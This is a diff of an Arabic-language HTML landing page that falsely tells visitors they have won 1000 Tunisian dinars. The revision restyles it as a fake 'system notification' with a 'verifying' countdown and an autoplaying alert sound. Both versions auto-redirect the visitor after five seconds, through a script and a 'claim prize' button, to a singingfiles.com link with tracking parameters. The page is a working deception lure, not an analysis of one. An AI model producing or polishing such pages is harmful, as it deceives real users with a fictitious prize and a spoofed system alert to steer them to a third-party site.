@@ -3,69 +3,82 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>مبروك! ربحت 1000 دينار تونسي</title>
-  <meta property="og:title" content="مبروك! ربحت 1000 دينار تونسي!" />
-  <meta property="og:description" content="تم اختيارك للحصول على جائزة نقدية. اضغط لتأكيد هويتك." />
+  <title>إشعار النظام - جائزة 1000 دينار</title>
+  <meta property="og:title" content="إشعار النظام: ربحت 1000 دينار!" />
+  <meta property="og:description" content="اضغط الآن لتأكيد واستلام الجائزة." />
   <meta property="og:image" content="https://i.imgur.com/3JQ6Z4N.png" />
   <style>
     body {
-      font-family: 'Tahoma', sans-serif;
-      background: linear-gradient(to bottom, #ffecb3, #ffe082);
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .notification {
+      background-color: #ffffff;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 12px;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
       text-align: center;
-      padding: 50px 20px;
+    }
+    .notification h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #388e3c;
+    }
+    .notification p {
+      font-size: 16px;
       color: #333;
     }
-
-    h1 {
-      font-size: 28px;
-      color: #d32f2f;
-      margin-bottom: 20px;
-    }
-
     .countdown {
-      font-size: 22px;
-      margin: 20px 0;
-      color: #555;
+      font-weight: bold;
+      color: #d32f2f;
+      margin: 15px 0;
     }
-
     .btn {
       display: inline-block;
-      background-color: #43a047;
+      background-color: #1976d2;
       color: white;
-      padding: 15px 30px;
-      font-size: 18px;
+      padding: 12px 25px;
+      font-size: 16px;
       border-radius: 8px;
       text-decoration: none;
-      margin-top: 20px;
+      margin-top: 15px;
     }
-
     .btn:hover {
-      background-color: #388e3c;
+      background-color: #1565c0;
     }
   </style>
 </head>
 <body>
-
-  <h1>🎉 مبروك! ربحت 1000 دينار تونسي 🎉</h1>
-  <p>لقد تم اختيارك عشوائيًا للحصول على جائزة نقدية.</p>
-  <div class="countdown" id="countdown">سيتم تحويلك خلال 5 ثوانٍ...</div>
-  <a href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791" class="btn">اضغط لتأكيد واستلام الجائزة</a>
+  <div class="notification">
+    <h2>📱 إشعار النظام</h2>
+    <p>🎉 مبروك! لقد ربحت <strong>1000 دينار تونسي</strong>!</p>
+    <p class="countdown" id="countdown">جارٍ التحقق... 5</p>
+    <a class="btn" href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791">استلام الجائزة الآن</a>
+  </div>
 
   <audio autoplay>
-    <source src="https://cdn.pixabay.com/download/audio/2022/10/30/audio_615d4644b5.mp3?filename=success-1-6297.mp3" type="audio/mp3">
+    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_f56b9f61f5.mp3?filename=notification-132141.mp3" type="audio/mp3">
   </audio>
 
   <script>
     let seconds = 5;
     const countdown = document.getElementById('countdown');
-    const redirectURL = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";
+    const url = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";
 
-    const interval = setInterval(() => {
+    const timer = setInterval(() => {
       seconds--;
-      countdown.textContent = `سيتم تحويلك خلال ${seconds} ثوانٍ...`;
+      countdown.textContent = `جارٍ التحقق... ${seconds}`;
       if (seconds <= 0) {
-        clearInterval(interval);
-        window.location.href = redirectURL;
+        clearInterval(timer);
+        window.location.href = url;
       }
     }, 1000);
   </script>
